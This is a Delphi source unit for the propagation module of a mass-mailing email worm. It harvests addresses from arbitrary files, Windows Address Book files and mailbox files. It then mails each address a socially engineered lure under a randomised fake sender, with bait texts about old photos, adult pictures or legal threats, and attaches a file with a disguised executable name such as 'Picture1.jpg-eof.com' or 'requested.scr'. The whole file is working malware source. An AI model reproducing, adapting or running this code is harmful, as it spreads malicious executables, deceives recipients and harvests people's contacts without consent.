   unit GetMail;

   interface

   Uses Windows, untMailSend, untStatus;

   Procedure DoGather(FileName: String);
   PROCEDURE ReadWAB(WABFile:STRING);
   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   Procedure DistrubateMail(Address: String);

   implementation

   Procedure DistrubateMail(Address: String);
   Var
     mailFrom      :String;
     mailTo        :String;
     mailSubject   :String;
     mailBody      :String;
     mailFile      :String;
     mailDomain    :String;
     mailDir       :Array[0..255]Of Char;
   Begin
     Inc(SPREAD_EMAIL_FOUND);

     GetSystemDirectory(mailDir, 256);
     mailTo := Address;

     Randomize;
     Case Random(5) Of
       0: mailDomain := 'hotmail.com';
       1: mailDomain := 'yahoo.com';
       2: mailDomain := 'gmail.com';
       3: mailDomain := 'msn.com';
       4: mailDomain := 'icq.com';
     End;

     Case Random(10) Of
       0:Begin
           mailFrom := 'mrsPatriks@';
           mailSubject := 'Look what i found :)';
           mailBody := 'I was cleaning my computer, and found these old pictures'#13#10+
                       'of us two together. Check em out :)';
           mailFile := 'link.mx40-runjava.getpic-Picture1.jpg-eof.com';
         End;
       1:Begin
           mailFrom := 'cutedevilgirl@';
           mailSubject := 'Hi! Long time no see :)';
           mailBody := 'I checked my old addressbook, and i found you. Havent talked'#13#10+
                       'for a while. How are you? Check my pic if you dont remember me.';
           mailFile := 'link.mx50-browse_getpic-Me.jpg-eof.com';
         End;
       2:Begin
           mailFrom := 'John_55@';
           mailSubject := 'heh.. whatsup ?';
           mailBody := 'Just wanted to send you this ;) hope you like the picture ;)'#13#10+
                       '(note: adult only, so dont have any kids near :p)';
           mailFile := 'hot-summerparty.jpg-link_getpic.com';
         End;
       3:Begin
           mailFrom := 'Susan_lovexx@';
           mailSubject := 'hi cutie!!!1';
           mailBody := 'Long time no see!!1 :-) :-)'#13#10+
                       'Havent talked to you for a while, hope you still okey. I added'+#13#10+
                       'my picture if you dont remember me (i hope you do tho :-). Write back ;-)';
           mailFile := 'javascript_GETPICTURE-myPicture.jpg-eof.com';
         End;
       4:Begin
           mailFrom := 'gary1@';
           mailSubject := 'What is this? :(';
           mailBody := 'I received a mail from you, with spam. If you know anything about this'#13#10+
                       'please contact me. Ive added a log of your mail :(';
           mailFile := 'mx50-java_getfile-mail-log.txt_eof.com';
         End;
       5:Begin
           mailFrom := 'nils_BMW22@';
           mailSubject := 'haha ;p';
           mailBody := 'hi ;p'#13#10+
                       'check this picture out ;d its hilarious ;D';
           mailFile := 'hahahaha.jpg-GETPICTURE_javascript.com';
         End;
       6:Begin
           mailFrom := 'bobtheman@';
           mailSubject := 'haha :) funny links.';
           mailBody := 'Hi! check these links out :) (no dangerous links.)'#13#10+
                       'funny1 - http://jokes.glowport.com/cartoon/badhair.gif :D hahahaha'#13#10+
                       'funnt2 - http://igloo.its.unimelb.edu.au/funny/backup/saveujob.jpg :D'#13#10+
                       'i hope those where funny :) if so, check the picture i attached ;)';
           mailFile := 'javascript_getpic-FUNNYPIC.JPG-eof.mx40link.com';
         End;
       7:Begin
           mailFrom := 'secretman@';
           mailSubject := '...';
           mailBody := '... testing';
           mailFile := 'testing.com';
         End;
       8:Begin
           mailFrom := 'liisa_jordan2@';
           mailSubject := 'Is this john? i hope it is :)';
           mailBody := 'Hi john!! :-) Long time no see eh?'#13#10+
                       'I added the file you wanted me to give you, tho im not sure its right mail.'#13#10+
                       'If its wrong, please delete this message, and do not open the attached file.';
           mailFile := 'requested.scr';
         End;
       9:Begin
           mailFrom := 'ralf6@';
           mailSubject := 'I will sue you!!!11 :@';
           mailBody := 'Look what you did to my computer!!!!'#13#10+
                       'i will find you, and kick the shit out of you!!.';
           mailFile := 'link.mx40.javascript-getpicture.com';
         End;
     End;

     mailFile := String(mailDir)+'\'+mailFile;
     mailFrom := mailFrom + mailDomain;

     MailSend(mailTo, mailFrom, mailFile, mailSubject, mailBody);
   End;

   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
   Try
    FullContents:='';

    AssignFile(Fcontents,Fname);
    Reset(Fcontents);
    Fsize:=FileSize(Fcontents);
    while not Eof(Fcontents) do begin
     BlockRead(Fcontents,Fbuffer,1024,rLen);
     FullContents:=FullContents + string(Fbuffer);
    end;
    CloseFile(Fcontents);

    if Length(FullContents) > Fsize then
     FullContents:=Copy(FullContents,1,Fsize);
   Except
     ;
   End;
   end;

   Function GetFileSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure DoGather(FileName: String);
   Var
     Ch            :String;
     Text          :String;
     Tmp1, Tmp2    :String;

     FileSize      :Integer;
     J             :Integer;
   Begin
     If FileName <> '' Then
     Begin
       FileSize := GetFileSize(FileName);
       If FileSize <= ((1024 * 1024) * 5) Then
       Begin
         ReadFileStr(FileName, Text);

         If Pos('@', Text) > 0 Then
         Begin
           Tmp1 := '';
           Tmp2 := '';
           Ch   := '';

           For J := 1 To Length(Text) Do
           Begin
             Ch := Text[J];
             If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
               Tmp1 := Tmp1 + Ch
             Else
             Begin
               If Pos('@', Tmp1) > 0 Then
               Begin
                 If (Tmp1 <> '@') And
                    (Tmp1[1] <> '@') And
                    (Tmp1[Length(Tmp1)] <> '@') And
                    (Pos('.', Tmp1) > 0) Then
                      DistrubateMail(Tmp1);
                 Tmp1 := '';
               End Else
                 Tmp1 := '';
             End;
           End;
         End;
       End;
     End;
   End;

   // .wab
   PROCEDURE ReadWAB(WABFile:STRING);
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
     Buf     : ARRAY[1..500] OF Char;
     R       : TextFile;
   BEGIN
     AssignFile(R,'Emails.txt');
     ReWrite(R);
     AssignFile(F,WABFile);
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         REPEAT
           BlockRead(F,N,2);
           IF N[1]+N[2]=#03#48 THEN BEGIN
             BlockRead(F,Buf,Ord(N[2])+30);
             S:='';
             FOR I:=1 TO Ord(N[2])+30 DO S:=S+Buf[I];
             Delete(S,1,3);
             I:=Pos(#00#00#00,S);
             IF I>0 THEN SetLength(S,I-1);
             FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
             FOR I:=1 TO Length(S) DO
               IF S[I]<chr(45) THEN BEGIN
                 SetLength(S,I-1);
                 Break;
               END;
            IF (Pos('@',S)>0)AND(Pos('.',S)>0) THEN DistrubateMail(S);
           END ELSE Seek(F,FilePos(F)-1);
         UNTIL FileSize(F)-FilePos(F)<6;
         CloseFile(F);
       END;
       CloseFile(R);
       {$I+}
   END;

   // .mbx .tbb .eml .mai .mbox
   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   LABEL
     Abort, Close;
   VAR
     F : TextFile;
     S : STRING;
     T : STRING;
     G : STRING;
     K : STRING;
     A : Byte;
     B : Byte;
     C : Byte;
     H : Byte;
     Y : Byte;
   BEGIN
     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult<>0 THEN GOTO Abort;
     REPEAT
       ReadLn(F,S);
       IF IOResult<>0 THEN GOTO Close;
       FOR C:=0 TO 3 DO BEGIN
         IF C=0 THEN K:='To: ';
         IF C=1 THEN K:='From: ';
         IF C=2 THEN K:='cc: ';
         IF C=3 THEN K:='Cc: ';
         IF Pos(K,S)=1 THEN BEGIN
           IF C=1 THEN Y:=2 ELSE Y:=0;
           Delete(S,1,Pos(K,S)+3+Y);
           IF Pos('<',S)>0 THEN BEGIN
             H:=0;
             REPEAT
               IF H=1 THEN BEGIN
                H:=0;
                 Readln(F,S);
                 IF IOResult<>0 THEN GOTO Close;
               END;
               REPEAT
                 A:=Pos('<',S);
                 B:=Pos('>',S);
                 T:=Copy(S,A+1,B-A-1);
                 IF Pos('@',T)>0 THEN DistrubateMail(T);
                Delete(S,1,B);
               UNTIL Pos('<',S)=0;
               IF Pos(',',S)>0 THEN H:=1;
             UNTIL H=0;
           END ELSE IF Pos('@',S)>0 THEN BEGIN
             IF (C<>1) THEN BEGIN
               G:=S;
               WHILE G[Length(G)]=',' DO BEGIN
                 Readln(F,G);
                 IF IOResult<>0 THEN GOTO Close;
                 S:=S+G;
               END;
               REPEAT
                 A:=0;
                 REPEAT
                   INC(A);
                 UNTIL S[A]<>' ';
                 G:=Copy(S,A,Pos(',',S)-A);
                 Delete(S,1,Pos(',',S));
                 IF Pos(' ',G)>0 THEN SetLength(G,Pos(' ',G));
                 IF(G<>'')AND(Pos('@',G)>0) THEN DistrubateMail(G);
               UNTIL Pos(',',S)=0;
               A:=0;
               REPEAT
                 INC(A);
               UNTIL S[A]<>' ';
               Delete(s,1,a-1);
               IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
               IF Pos('@',S)>0 THEN DistrubateMail(S);
             END;
           END;
         END;
       END;
     UNTIL EOF(F);
     Close:
     CloseFile(F);
     Abort:
     {$I+}
   END;

   end.
